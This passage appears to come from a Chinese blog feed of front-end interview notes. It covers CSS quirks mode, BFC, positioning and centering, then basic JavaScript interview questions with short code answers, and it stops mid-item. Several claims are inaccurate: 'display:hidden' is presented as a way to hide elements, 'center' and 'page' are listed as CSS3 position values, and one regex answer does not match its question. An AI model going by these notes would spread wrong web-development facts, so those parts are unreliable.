标准的网页而产生的一种页面渲染模式。浏览器基于页面中文件类型描述的存在以决定采用哪种渲染模式；如果存在一个完整的<code>DOCTYPE</code>则浏览器将会采用标准模式，而如果它缺失则浏览器将会采用怪异模式。</p><p>强烈建议阅读加深理解：[怪异模式（Quirks Mode）对 HTML 页面的影响]<a href="http://note.youdao.com/" target="_blank" rel="noopener">link</a>(<a href="http://www.ibm.com/developerworks/cn/web/1310_shatao_quirks/)，这里列下浏览器标准模式和怪异模式的区别：" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/web/1310_shatao_quirks/)，这里列下浏览器标准模式和怪异模式的区别：</a></p><ul><li>盒模型： <ul><li>在怪异模式下，盒模型为IE盒模型而非标准模式下的W3C 盒模型：在 IE 盒模型中，box width = content width + padding left + padding right + border left + border right，- box height = content height + padding top + padding bottom + border top + border bottom。而在 W3C 标准的盒模型中，box 的大小就是 content 的大小。</li></ul></li><li>图片元素的垂直对齐方式: <ul><li>对于<code>inline</code>元素和<code>table-cell</code>元素，在 IE Standards Mode 下 vertical-align 属性默认取值为<code>baseline</code>。而当<code>inline</code>元素的内容只有图片时，如<code>table</code>的单元格<code>table-cell</code>。在 IE Quirks Mode 下，<code>table</code>单元格中的图片的 <code>vertical-align</code> 属性默认为<code>bottom</code>，因此，在图片底部会有几像素的空间。</li></ul></li><li><code><table></code>元素中的字体: <ul><li>CSS 中，描述<code>font</code>的属性有<code>font-family</code>，<code>font-size</code>，<code>font-style</code>，<code>font-weigh</code>,上述属性都是可以继承的。而在 IE Quirks Mode 下，对于<code>table</code> 元素，字体的某些属性将不会从<code>body</code>或其他封闭元素继承到<code>table</code>中，特别是 <code>font-size</code>属性。</li></ul></li><li>内联元素的尺寸: <ul><li>在 IE Standards Mode 下，non-replaced inline 元素无法自定义大小，而在 IE Quirks Mode 下，定义这些元素的<code>width</code>和<code>height</code> 属性，能够影响该元素显示的大小尺寸。</li></ul></li><li>元素的百分比高度: <ul><li>a、CSS 中对于元素的百分比高度规定如下，百分比为元素包含块的高度，不可为负值。如果包含块的高度没有显式给出，该值等同于“auto”（即取决于内容的高度）。所以百分比的高度必须在父元素有声明高度时使用。</li><li>b、当一个元素使用百分比高度时，在 IE Standards Mode 下，高度取决于内容的变化，而在 Quirks Mode 下，百分比高度则被正确应用。</li></ul></li><li>元素溢出的处理： <ul><li>在 IE Standard Mode 下，<code>overflow</code>取默认值 <code>visible</code>，即溢出可见，这种情况下，溢出内容不会被裁剪，呈现在元素框外。而在 Quirks Mode 下，该溢出被当做扩展<code>box</code>来对待，即元素的大小由其内容决定，溢出不会被裁剪，元素框自动调整，包含溢出内容</li></ul></li></ul><h3 id="说说你对边距折叠的理解"><a href="#说说你对边距折叠的理解" class="headerlink" title="说说你对边距折叠的理解?"></a>说说你对边距折叠的理解?</h3><ul><li>外边距折叠： 相邻的两个或多个外边距 (margin) 在垂直方向会合并成一个外边距（margin）</li><li>相邻： 没有被非空内容、padding、border 或 clear 分隔开的margin特性. 非空内容就是说这元素之间要么是兄弟关系或者父子关系</li><li>垂直方向外边距合并计算: <ul><li>参加折叠的margin都是正值：取其中 margin 较大的值为最终 margin 值。</li><li>参与折叠的 margin 都是负值：取的是其中绝对值较大的，然后，从 0 位置，负向位移。</li><li>参与折叠的 margin 中有正值，有负值：先取出负 margin 中绝对值中最大的，然后，和正 margin 值中最大的 margin 相加。</li></ul></li></ul><h3 id="说说隐藏元素的方式有哪些？"><a href="#说说隐藏元素的方式有哪些？" class="headerlink" title="说说隐藏元素的方式有哪些？"></a>说说隐藏元素的方式有哪些？</h3><ul><li>使用CSS的display:none，不会占有原来的位置</li><li>使用CSS的display:hidden，会占有原来的位置</li><li>使用CSS的visibility:hidden，会占有原来的位置</li><li>使用HTML5中的新增属性hidden=”hidden”，不会占有原来的位置</li></ul><h3 id="为什么重置浏览器默认样式，如何重置默浏览器认样式？"><a href="#为什么重置浏览器默认样式，如何重置默浏览器认样式？" class="headerlink" title="为什么重置浏览器默认样式，如何重置默浏览器认样式？"></a>为什么重置浏览器默认样式，如何重置默浏览器认样式？</h3><p>每种浏览器都有一套默认的样式表，即user agent stylesheet，网页在没有指定的样式时，按浏览器内置的样式表来渲染。这是合理的，像word中也有一些预留样式，可以让我们的排版更美观整齐。不同浏览器甚至同一浏览器不同版本的默认样式是不同的。但这样会有很多兼容问题。</p><ul><li>最简单的办法：（不推荐使用）*{margin: 0;padding: 0;}。</li><li>使用CSSReset可以将所有浏览器默认样式设置成一样。</li><li>normalize：也许有些cssreset过于简单粗暴，有点伤及无辜，normalize是另一个选择。bootstrap已经引用该css来重置浏览器默认样式，比普通的cssreset要精细一些，保留浏览器有用的默认样式，支持包括手机浏览器在内的超多浏览器，同时对HTML5元素、排版、列表、嵌入的内容、表单和表格都进行了一般化。</li></ul><h3 id="谈谈你对BFC与IFC的理解？-是什么，如何产生，作用"><a href="#谈谈你对BFC与IFC的理解？-是什么，如何产生，作用" class="headerlink" title="谈谈你对BFC与IFC的理解？(是什么，如何产生，作用)"></a>谈谈你对BFC与IFC的理解？(是什么，如何产生，作用)</h3><ul><li>什么是BFC与IFC<ul><li>BFC（Block Formatting Context）即“块级格式化上下文”， IFC（Inline Formatting Context）即行内格式化上下文。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态。一个框在常规流中必须属于一个格式化上下文，你可以把BFC想象成一个大箱子，箱子外边的元素将不与箱子内的元素产生作用。</li><li>BFC是W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行定位，以及与其他元素的关系和相互作用。当涉及到可视化布局的时候，Block Formatting Context提供了一个环境，HTML元素在这个环境中按照一定规则进行布局。一个环境中的元素不会影响到其它环境中的布局。比如浮动元素会形成BFC，浮动元素内部子元素的主要受该浮动元素影响，两个浮动元素之间是互不影响的。也可以说BFC就是一个作用范围。</li><li>在普通流中的 Box(框) 属于一种 formatting context(格式化上下文) ，类型可以是 block ，或者是 inline ，但不能同时属于这两者。并且， Block boxes(块框) 在 block formatting context(块格式化上下文) 里格式化， Inline boxes(块内框) 则在 Inline Formatting Context(行内格式化上下文) 里格式化。</li></ul></li><li><p>如何产生BFC</p><p>当一个HTML元素满足下面条件的任何一点，都可以产生Block Formatting Context：</p><ul><li>float的值不为none</li><li>overflow的值不为visible</li><li>display的值为table-cell, table-caption, inline-block中的任何一个</li><li>position的值不为relative和static</li><li>CSS3触发BFC方式则可以简单描述为：在元素定位非static，relative的情况下触发，float也是一种定位方式。</li></ul></li><li>(3)、BFC的作用与特点<ul><li>不和浮动元素重叠，清除外部浮动，阻止浮动元素覆盖</li><li>如果一个浮动元素后面跟着一个非浮动的元素，那么就会产生一个重叠的现象。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态，当float不为none时，position为absolute、fixed时元素将脱离标准流。</li></ul></li></ul><h3 id="说说你对页面中使用定位-position-的理解？"><a href="#说说你对页面中使用定位-position-的理解？" class="headerlink" title="说说你对页面中使用定位(position)的理解？"></a>说说你对页面中使用定位(position)的理解？</h3><p>使用css布局position非常重要，语法如下：<br>position：static | relative | absolute | fixed | center | page | sticky<br>默认值：static，center、page、sticky是CSS3中新增加的值。</p><ul><li>static <ul><li>可以认为静态的，默认元素都是静态的定位，对象遵循常规流。此时4个定位偏移属性不会被应用，也就是使用left，right，bottom，top将不会生效。</li></ul></li><li>relative </li><li>相对定位，对象遵循常规流，并且参照自身在常规流中的位置通过top，right，bottom，left这4个定位偏移属性进行偏移时不会影响常规流中的任何元素。</li><li>absolute <ul><li>绝对定位，对象脱离常规流，此时偏移属性参照的是离自身最近的定位祖先元素，如果没有定位的祖先元素，则一直回溯到body元素。盒子的偏移位置不影响常规流中的任何元素，其margin不与其他任何margin折叠。</li><li>元素定位参考的是离自身最近的定位祖先元素，要满足两个条件，第一个是自己的祖先元素，可以是父元素也可以是父元素的父元素，一直找，如果没有则选择body为对照对象。第二个条件是要求祖先元素必须定位，通俗说就是position的属性值为非static都行。</li></ul></li><li>fixed <ul><li>固定定位，与absolute一致，但偏移定位是以窗口为参考。当出现滚动条时，对象不会随着滚动。</li></ul></li><li>center <ul><li>与absolute一致，但偏移定位是以定位祖先元素的中心点为参考。盒子在其包含容器垂直水平居中。（CSS3）</li></ul></li><li>、page <ul><li>与absolute一致。元素在分页媒体或者区域块内，元素的包含块始终是初始包含块，否则取决于每个absolute模式。（CSS3）</li></ul></li><li>sticky <ul><li>对象在常态时遵循常规流。它就像是relative和fixed的合体，当在屏幕中时按常规流排版，当卷动到屏幕外时则表现如fixed。该属性的表现是现实中你见到的吸附效果。（CSS3）</li></ul></li></ul><h3 id="如何解决多个元素重叠问题？"><a href="#如何解决多个元素重叠问题？" class="headerlink" title="如何解决多个元素重叠问题？"></a>如何解决多个元素重叠问题？</h3><ul><li>使用z-index属性可以设置元素的层叠顺序 </li><li>z-index属性</li><li>语法：z-index: auto | <integer></integer></li><li>默认值：auto</li><li>适用于：定位元素。即定义了position为非static的元素</li><li>取值： </li><li>auto： 元素在当前层叠上下文中的层叠级别是0。元素不会创建新的局部层叠上下文，除非它是根元素。 </li><li>整数： 用整数值来定义堆叠级别。可以为负值。 说明： </li><li>检索或设置对象的层叠顺序。 </li><li>z-index用于确定元素在当前层叠上下文中的层叠级别，并确定该元素是否创建新的局部层叠上下文。 </li><li>当多个元素层叠在一起时，数字大者将显示在上面。</li></ul><h3 id="伪类和伪元素的区别"><a href="#伪类和伪元素的区别" class="headerlink" title="伪类和伪元素的区别"></a>伪类和伪元素的区别</h3><p>CSS 伪类用于向某些选择器添加特殊的效果。</p><p>CSS 伪元素用于将特殊的效果添加到某些选择器。</p><p>可以明确两点，第一两者都与选择器相关，第二就是添加一些“特殊”的效果。这里特殊指的是两者描述了其他 css 无法描述的东西。</p><p>伪类种类</p><p><img src="http://segmentfault.com/img/bVcccn" alt="image"></p><p>伪元素种类</p><p><img src="http://segmentfault.com/img/bVccco" alt="image"></p><h3 id="CSS实现垂直居中"><a href="#CSS实现垂直居中" class="headerlink" title="CSS实现垂直居中"></a>CSS实现垂直居中</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><div class="parent"></span><br><span class="line">  <div class="children"></div></span><br><span class="line"></div></span><br></pre></td></tr></tbody></table></figure><p>果我们要实现 .children 在 .parent 中垂直居中。</p><p>通常第一印象会想起给父元素设置相对定位，给子元素设置绝对定位。这样子元素就相对于父元素定位，再通过 top 与 left 各偏移 50% 父元素宽度，使用 margin-* 来修正子元素的位置。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.parent {</span><br><span class="line">  position: relative;</span><br><span class="line">}</span><br><span class="line">.chilren {</span><br><span class="line">  width: $width;</span><br><span class="line">  height: $height;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 50%;</span><br><span class="line">  left: 50%;</span><br><span class="line">  margin-top: -$height/2;</span><br><span class="line">  margin-left: -$width/2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过这种方式可以使得子元素在父元素中垂直居中。但是这种实现的方式需要知道子元素的宽高，以方便使用 margin-* 来修正之前的位置。</p><p>当不知道子元素的宽高时，这种方法就无法实现正真的垂直居中。这个时候就可以使用 transform: translate(-50%, -50%); 来实现子元素自身的偏移。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.parent {</span><br><span class="line">  position: relative;</span><br><span class="line">}</span><br><span class="line">.chilren {</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 50%;</span><br><span class="line">  left: 50%;</span><br><span class="line">  transform: translate(-50%, -50%);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>那么不使用定位是否能够使元素垂直居中呢？</p><p>这时候我们来想想要使元素水平居中的时候，我们会怎么做？Ok，一般我们都会用 margin: 0 auto;那么我们就可以让 margin-top: 50%, 这样的效果就跟相对定位时的 top: 50% 的效果差不多。接着就可以使用之前使用过的 transform 属性来使得元素向上偏移自身高度的一半，也就是 transform: translateY(-50%);。</p><p>这样就可以实现不使用定位来来使得元素垂直居中了。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.chilren {</span><br><span class="line">  margin: 50% auto 0;</span><br><span class="line">  transform: translateY(-50%);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>除了上面的这些方法之外，还可以使用 Flexbox 布局来实现。</p><p>只需要在父元素中使用 display: flex;，然后在子元素上使用 margin: auto; 就可以实现垂直居中了。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.parent {</span><br><span class="line">  display: flex;</span><br><span class="line">}</span><br><span class="line">.chilren {</span><br><span class="line">  margin: auto;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS面试题</title>
      <link href="/2018/05/06/JS%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/"/>
      <url>/2018/05/06/JS%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h2><h3 id="0-JS继承的实现方式"><a href="#0-JS继承的实现方式" class="headerlink" title="==0. JS继承的实现方式=="></a>==0. JS继承的实现方式==</h3><p>原型链继承</p><p>核心： 将父类的实例作为子类的原型</p><p>构造继承</p><p>核心：使用父类的构造函数来增强子类实例，等于是复制父类的实例属性给子类</p><p>call & apply</p><h3 id="1-列举js异步编程的方法"><a href="#1-列举js异步编程的方法" class="headerlink" title="==1. 列举js异步编程的方法=="></a>==1. 列举js异步编程的方法==</h3><p>回调函数，这是异步编程最基本的方法。<br>事件监听，另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。<br>发布/订阅，上一节的”事件”，完全可以理解成”信号”。<br>Promises对象，Promises 对象是CommonJS 工作组提出的一种规范，目的是为异步编程提供统一接口。</p><h3 id="2-JavaScript的数据类型都有什么？"><a href="#2-JavaScript的数据类型都有什么？" class="headerlink" title="==2. JavaScript的数据类型都有什么？=="></a>==2. JavaScript的数据类型都有什么？==</h3><p>基本数据类型：String,Boolean,Number,Undefined, Null</p><p>引用数据类型：Object(Array,Date,RegExp,Function)</p><p><strong>那么问题来了，如何判断某变量是否为数组数据类型？</strong></p><ul><li>方法一.判断其是否具有“数组性质”，如slice()方法。可自己给该变量定义slice方法，故有时会失效</li><li>方法二.obj instanceof Array 在某些IE版本中不正确</li><li>方法三.方法一二皆有漏洞，在ECMA Script5中定义了新方法Array.isArray(), 保证其兼容性，最好的方法如下：</li></ul><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Array</span>.isArray===<span class="string">"undefined"</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">Array</span>.isArray = <span class="function"><span class="keyword">function</span>(<span class="params">arg</span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(arg)===<span class="string">"[object Array]"</span></span><br><span class="line">    }; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="3-已知ID的Input输入框，希望获取这个输入框的输入值，怎么做？-不使用第三方框架"><a href="#3-已知ID的Input输入框，希望获取这个输入框的输入值，怎么做？-不使用第三方框架" class="headerlink" title="==3. 已知ID的Input输入框，希望获取这个输入框的输入值，怎么做？(不使用第三方框架)=="></a>==3. 已知ID的Input输入框，希望获取这个输入框的输入值，怎么做？(不使用第三方框架)==</h3><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(“ID”).value</span><br></pre></td></tr></tbody></table></figure><h3 id="4-希望获取到页面中所有的checkbox怎么做？-不使用第三方框架"><a href="#4-希望获取到页面中所有的checkbox怎么做？-不使用第三方框架" class="headerlink" title="==4. 希望获取到页面中所有的checkbox怎么做？(不使用第三方框架)=="></a>==4. 希望获取到页面中所有的checkbox怎么做？(不使用第三方框架)==</h3><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> domList = <span class="built_in">document</span>.getElementsByTagName(‘input’)</span><br><span class="line"><span class="keyword">var</span> checkBoxList = [];</span><br><span class="line"><span class="keyword">var</span> len = domList.length;　　<span class="comment">//缓存到局部变量</span></span><br><span class="line"><span class="keyword">while</span> (len--) {　　<span class="comment">//使用while的效率会比for循环更高</span></span><br><span class="line">　　<span class="keyword">if</span> (domList[len].type == ‘checkbox’) {</span><br><span class="line">    　　checkBoxList.push(domList[len]);</span><br><span class="line">　　}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="5-设置一个已知ID的DIV的html内容为xxxx，字体颜色设置为黑色-不使用第三方框架"><a href="#5-设置一个已知ID的DIV的html内容为xxxx，字体颜色设置为黑色-不使用第三方框架" class="headerlink" title="==5. 设置一个已知ID的DIV的html内容为xxxx，字体颜色设置为黑色(不使用第三方框架)=="></a>==5. 设置一个已知ID的DIV的html内容为xxxx，字体颜色设置为黑色(不使用第三方框架)==</h3><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dom = <span class="built_in">document</span>.getElementById(“ID”);</span><br><span class="line">dom.innerHTML = “xxxx”;</span><br><span class="line">dom.style.color = “#000”;</span><br></pre></td></tr></tbody></table></figure><h3 id="6-当一个DOM节点被点击时候，我们希望能够执行一个函数，应该怎么做？"><a href="#6-当一个DOM节点被点击时候，我们希望能够执行一个函数，应该怎么做？" class="headerlink" title="==6. 当一个DOM节点被点击时候，我们希望能够执行一个函数，应该怎么做？=="></a>==6. 当一个DOM节点被点击时候，我们希望能够执行一个函数，应该怎么做？==</h3><ul><li>直接在DOM里绑定事件：<div onclick="”test()”"></div></li><li>在JS里通过onclick绑定：xxx.onclick = test </li><li>通过事件添加进行绑定：( ⊙ o ⊙ )啊！5addEventListener(xxx, ‘click’, test) </li></ul><p>IE为事件冒泡用attachEvent()<br><strong>那么问题来了，Javascript的事件流模型都有什么？</strong></p><ul><li>“事件冒泡”：事件开始由最具体的元素接受，然后逐级向上传播</li><li>“事件捕捉”：事件由最不具体的节点先接收，然后逐级向下，一直到最具体的</li><li>“DOM事件流”：三个阶段：事件捕捉，目标阶段，事件冒泡</li></ul><h3 id="7-什么是Ajax和JSON，它们的优缺点。"><a href="#7-什么是Ajax和JSON，它们的优缺点。" class="headerlink" title="==7. 什么是Ajax和JSON，它们的优缺点。=="></a>==7. 什么是Ajax和JSON，它们的优缺点。==</h3><p>Ajax是异步JavaScript和XML，用于在Web页面中实现异步数据交互。</p><p>优点：</p><ul><li>可以使得页面不重载全部内容的情况下加载局部内容，降低数据传输量</li><li>避免用户不断刷新或者跳转页面，提高用户体验</li></ul><p>缺点：</p><ul><li>对搜索引擎不友好（</li><li>要实现ajax下的前后退功能成本较大</li><li>可能造成请求数的增加</li><li>跨域问题限制</li></ul><p>JSON是一种轻量级的数据交换格式，ECMA的一个子集</p><p>优点：轻量级、易于人的阅读和编写，便于机器（JavaScript）解析，支持复合数据类型（数组、对象、字符串、数字）</p><h3 id="8-看下列代码输出为何？解释原因。"><a href="#8-看下列代码输出为何？解释原因。" class="headerlink" title="==8. 看下列代码输出为何？解释原因。=="></a>==8. 看下列代码输出为何？解释原因。==</h3><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line">alert(<span class="keyword">typeof</span> a); <span class="comment">// undefined</span></span><br><span class="line">alert(b); <span class="comment">// 报错</span></span><br></pre></td></tr></tbody></table></figure><p>解释：Undefined是一个只有一个值的数据类型，这个值就是“undefined”，在使用var声明变量但并未对其赋值进行初始化时，这个变量的值就是undefined。而b由于未声明将报错。注意未申明的变量和声明了未赋值的是不一样的。</p><h3 id="9-看下列代码-输出什么？解释原因。"><a href="#9-看下列代码-输出什么？解释原因。" class="headerlink" title="==9. 看下列代码,输出什么？解释原因。=="></a>==9. 看下列代码,输出什么？解释原因。==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = null;</span><br><span class="line">alert(typeof a); //object</span><br></pre></td></tr></tbody></table></figure><p>解释：null是一个只有一个值的数据类型，这个值就是null。表示一个空指针对象，所以用typeof检测会返回”object”。</p><h3 id="10-看下列代码-输出什么？解释原因。"><a href="#10-看下列代码-输出什么？解释原因。" class="headerlink" title="==10. 看下列代码,输出什么？解释原因。="></a>==10. 看下列代码,输出什么？解释原因。=</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var undefined;</span><br><span class="line">undefined == null; // true</span><br><span class="line">1 == true;   // true</span><br><span class="line">2 == true;   // false</span><br><span class="line">0 == false;  // true</span><br><span class="line">0 == '';     // true</span><br><span class="line">NaN == NaN;  // false</span><br><span class="line">[] == false; // true</span><br><span class="line">[] == ![];   // true</span><br></pre></td></tr></tbody></table></figure><ul><li>undefined与null相等，但不恒等（===）</li><li>一个是number一个是string时，会尝试将string转换为number</li><li>尝试将boolean转换为number，0或1</li><li>尝试将Object转换成number或string，取决于另外一个对比量的类型</li><li>所以，对于0、空字符串的判断，建议使用 “===” 。“===”会先判断两边的值类型，类型不匹配时为false。</li></ul><p><strong>那么问题来了，看下面的代码，输出什么，foo的类型为什么？</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var foo = "11"+2-"1";</span><br><span class="line">console.log(foo);</span><br><span class="line">console.log(typeof foo);</span><br></pre></td></tr></tbody></table></figure><p>执行完后foo的值为111，foo的类型为Number。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var foo = "11"+2+"1";    //体会加一个字符串'1' 和 减去一个字符串'1'的不同</span><br><span class="line">console.log(foo);</span><br><span class="line">console.log(typeof foo);</span><br></pre></td></tr></tbody></table></figure><p>执行完后foo的值为1121(此处是字符串拼接)，foo的类型为String。</p><h3 id="11-看代码给答案。"><a href="#11-看代码给答案。" class="headerlink" title="==11. 看代码给答案。=="></a>==11. 看代码给答案。==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a = new Object();</span><br><span class="line">a.value = 1;</span><br><span class="line">b = a;</span><br><span class="line">b.value = 2;</span><br><span class="line">alert(a.value);</span><br></pre></td></tr></tbody></table></figure><p>答案：2（考察引用数据类型细节）</p><h3 id="12-已知数组var-stringArray-“This”-“is”-“Baidu”-“Campus”-，Alert出”This-is-Baidu-Campus”-。"><a href="#12-已知数组var-stringArray-“This”-“is”-“Baidu”-“Campus”-，Alert出”This-is-Baidu-Campus”-。" class="headerlink" title="==12. 已知数组var stringArray = [“This”, “is”, “Baidu”, “Campus”]，Alert出”This is Baidu Campus”==。"></a>==12. 已知数组var stringArray = [“This”, “is”, “Baidu”, “Campus”]，Alert出”This is Baidu Campus”==。</h3><p>答案：alert(stringArray.join(“ “))</p><p><strong>那么问题来了，已知有字符串foo=”get-element-by-id”,写一个function将其转化成驼峰表示法”getElementById”。</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function combo(msg){</span><br><span class="line">    var arr = msg.split("-");</span><br><span class="line">    var len = arr.length;    //将arr.length存储在一个局部变量可以提高for循环效率</span><br><span class="line">    for(var i=1;i<len;i++){</span><br><span class="line">        arr[i]=arr[i].charAt(0).toUpperCase()+arr[i].substr(1,arr[i].length-1);</span><br><span class="line">    }</span><br><span class="line">    msg=arr.join("");</span><br><span class="line">    return msg;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="13-var-numberArray-3-6-2-4-1-5-（考察基础API）"><a href="#13-var-numberArray-3-6-2-4-1-5-（考察基础API）" class="headerlink" title="==13. var numberArray = [3,6,2,4,1,5]; （考察基础API）=="></a>==13. var numberArray = [3,6,2,4,1,5]; （考察基础API）==</h3><p>1) 实现对该数组的倒排，输出[5,1,4,2,6,3]</p><p>2) 实现对该数组的降序排列，输出[6,5,4,3,2,1]</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var numberArray = [3,6,2,4,1,5];</span><br><span class="line">numberArray.reverse(); // 5,1,4,2,6,3</span><br><span class="line">numberArray.sort(function(a,b){  //6,5,4,3,2,1</span><br><span class="line">   return b-a;</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><h3 id="14-输出今天的日期，以YYYY-MM-DD的方式，比如今天是2014年9月26日，则输出2014-09-26"><a href="#14-输出今天的日期，以YYYY-MM-DD的方式，比如今天是2014年9月26日，则输出2014-09-26" class="headerlink" title="==14. 输出今天的日期，以YYYY-MM-DD的方式，比如今天是2014年9月26日，则输出2014-09-26=="></a>==14. 输出今天的日期，以YYYY-MM-DD的方式，比如今天是2014年9月26日，则输出2014-09-26==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var d = new Date();</span><br><span class="line">// 获取年，getFullYear()返回4位的数字</span><br><span class="line">var year = d.getFullYear();</span><br><span class="line">// 获取月，月份比较特殊，0是1月，11是12月</span><br><span class="line">var month = d.getMonth() + 1;</span><br><span class="line">// 变成两位</span><br><span class="line">month = month < 10 ? '0' + month : month;</span><br><span class="line">// 获取日</span><br><span class="line">var day = d.getDate();</span><br><span class="line">day = day < 10 ? '0' + day : day;</span><br><span class="line">alert(year + '-' + month + '-' + day);</span><br></pre></td></tr></tbody></table></figure><h3 id="15-将字符串”-id-id-name-”中的-id-替换成10，-id-替换成10，-name-替换成Tony-（使用正则表达式）"><a href="#15-将字符串”-id-id-name-”中的-id-替换成10，-id-替换成10，-name-替换成Tony-（使用正则表达式）" class="headerlink" title="==15. 将字符串”{id}{id}{name}”中的{id}替换成10，{id}替换成10，{name}替换成Tony （使用正则表达式）=="></a>==15. 将字符串”{id}{id}{name}”中的{id}替换成10，{id}替换成10，{name}替换成Tony （使用正则表达式）==</h3><p>答案：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<tr><td>{id}</td><td>{id}</td><td>{id}_{$name}</td></tr>".replace(/{\$id}/g, '10').replace(/{\$name}/g, ‘Tony’);</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="16-为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数escapeHtml，将-lt-gt-amp-“进行转义"><a href="#16-为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数escapeHtml，将-lt-gt-amp-“进行转义" class="headerlink" title="==16. 为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数escapeHtml，将<, >, &, “进行转义=="></a>==16. 为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数escapeHtml，将<, >, &, “进行转义==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 